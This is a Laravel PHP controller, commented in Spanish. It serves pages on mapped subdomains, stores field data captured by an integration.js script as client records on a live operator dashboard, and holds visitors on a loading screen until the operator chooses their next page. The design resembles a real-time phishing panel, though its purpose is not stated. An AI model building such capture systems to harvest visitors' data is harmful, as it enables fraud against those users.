<?php

namespace App\Http\Controllers;

use App\Models\Company;
use App\Models\Project;
use App\Models\ProjectDomain;
use App\Services\Projects\ProjectRenderer;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Str;

/**
 * Sirve al público las vistas de los proyectos publicados y recibe los datos
 * que capturan. La recepción reutiliza el mecanismo existente: cada envío
 * registra un cliente (Company), que aparece en el tablero en vivo del panel.
 */
class PublicSiteController extends Controller
{
    public function __construct(private ProjectRenderer $renderer) {}

    /** Sirve una vista por ruta: /sitio/{proyecto}/{vista?} */
    public function serve(Project $project, ?string $viewSlug = null)
    {
        abort_unless($project->isPublished(), 404);

        // Sin vista en la URL se sirve la principal (index) del proyecto.
        $view = $viewSlug
            ? $project->views()->where('slug', $viewSlug)->firstOrFail()
            : $project->indexView();
        abort_if($view === null, 404);

        return response($this->renderer->render($view))
            ->header('Content-Type', 'text/html; charset=utf-8');
    }

    /** Resuelve el host (subdominio) a su proyecto y sirve la vista principal. */
    public function serveByHost(Request $request, ?string $viewSlug = null)
    {
        $domain = ProjectDomain::where('host', strtolower($request->getHost()))->first();
        abort_if($domain === null, 404);

        return $this->serve($domain->project, $viewSlug);
    }

    /** ¿El host de la petición pertenece a un proyecto? (para '/' y fallback). */
    public static function hostIsProject(Request $request): bool
    {
        return ProjectDomain::where('host', strtolower($request->getHost()))->exists();
    }

    /** Recibe los datos capturados por integration.js. */
    public function submit(Request $request, string $projectSlug, string $viewSlug): JsonResponse
    {
        $project = Project::where('slug', $projectSlug)->first();
        $view = $project
            ? $project->views()->where('slug', $viewSlug)->first()
            : null;

        if (! $project || ! $view || ! $project->isPublished()) {
            return response()->json(['ok' => false, 'message' => 'La vista no está disponible.'], 404);
        }

        $data = $request->validate([
            'view_target' => ['nullable', 'string', 'max:255'],
            'session' => ['nullable', 'uuid'],
            'data' => ['nullable', 'array'],
            'value' => ['nullable'],
        ]);

        // Modo "single": llega un único valor; modo "map": un objeto de campos.
        $payload = $data['data'] ?? [];
        if (($payload === [] || $payload === null) && array_key_exists('value', $data)) {
            $payload = ['value' => $data['value']];
        }

        if ($payload === [] || $payload === null) {
            return response()->json(['ok' => false, 'message' => 'No se recibió información.'], 422);
        }

        $meta = [
            '_proyecto' => $project->slug,
            '_vista' => $view->slug,
            '_target' => $data['view_target'] ?? null,
        ];

        // Continuidad de sesión: si llega un token conocido, los datos se suman al
        // MISMO cliente (no se crea otro), así no se confunde un navegador con otro.
        $company = ! empty($data['session'])
            ? Company::where('loading_token', $data['session'])->first()
            : null;

        if ($company) {
            $company->data = array_merge($company->data ?? [], $payload, $meta);
            if (blank($company->name) && $this->guessName($payload)) {
                $company->name = $this->guessName($payload);
            }
            $company->last_activity_at = now();
            // Al entregar un nuevo dato, se cierra la vista pendiente para que el
            // operador decida el siguiente paso.
            $company->forceFill(['next_view_id' => null, 'next_view_at' => null]);
            $company->save();
        } else {
            // Reutiliza el registro de clientes existente: el envío aparece en el tablero.
            $company = new Company([
                'empresa' => $project->name,
                'name' => $this->guessName($payload),
                'fecha' => now(),
                'data' => array_merge($payload, $meta),
            ]);
            $company->forceFill(['loading_token' => (string) Str::uuid()]);
            $company->last_activity_at = now();
            $company->save();
            $company->registro = 'REG-'.str_pad((string) $company->id, 4, '0', STR_PAD_LEFT);
            $company->save();
        }

        return response()->json([
            'ok' => true,
            'message' => 'Información recibida.',
            'loading_token' => $company->loading_token,
            // Si el proyecto tiene pantalla de carga, el cliente pasa a esperar allí.
            'loading_url' => $this->loadingUrl($project, $company->loading_token),
        ], 201);
    }

    /**
     * Sondeo por token de sesión del navegador (independiente del proyecto):
     * ¿el operador ya pidió la siguiente vista para ESTE usuario exacto?
     */
    public function nextBySession(string $session): JsonResponse
    {
        return $this->next('', $session);
    }

    /**
     * Sondeo de la pantalla de carga: ¿el operador ya pidió la siguiente vista?
     * Devuelve su URL (con la sesión) una sola vez y la marca como consumida.
     */
    public function next(string $projectSlug, string $session): JsonResponse
    {
        $company = Company::where('loading_token', $session)->first();

        if (! $company || ! $company->next_view_id) {
            return response()->json(['url' => null])->header('Cache-Control', 'no-store');
        }

        $view = $company->nextView()->with('project')->first();
        if (! $view || ! $view->project || ! $view->project->isPublished()) {
            return response()->json(['url' => null])->header('Cache-Control', 'no-store');
        }

        // Consumir: se entrega una sola vez para no reenviar en el siguiente sondeo.
        $company->forceFill(['next_view_id' => null, 'next_view_at' => null])->save();

        $url = "/sitio/{$view->project->slug}/{$view->slug}?s=".urlencode($session);

        return response()->json(['url' => $url])->header('Cache-Control', 'no-store');
    }

    /** URL de la pantalla de carga del proyecto con la sesión, si existe. */
    private function loadingUrl(Project $project, ?string $session): ?string
    {
        $loading = $project->loadingView();
        if (! $loading || ! $session) {
            return null;
        }

        return "/sitio/{$project->slug}/{$loading->slug}?s=".urlencode($session);
    }

    /** Intenta un nombre legible a partir de campos típicos. */
    private function guessName(array $payload): ?string
    {
        foreach (['nombre', 'name', 'nombres', 'fullname', 'full_name'] as $key) {
            if (! empty($payload[$key]) && is_string($payload[$key])) {
                return Str::limit(trim($payload[$key]), 255, '');
            }
        }

        return null;
    }
}
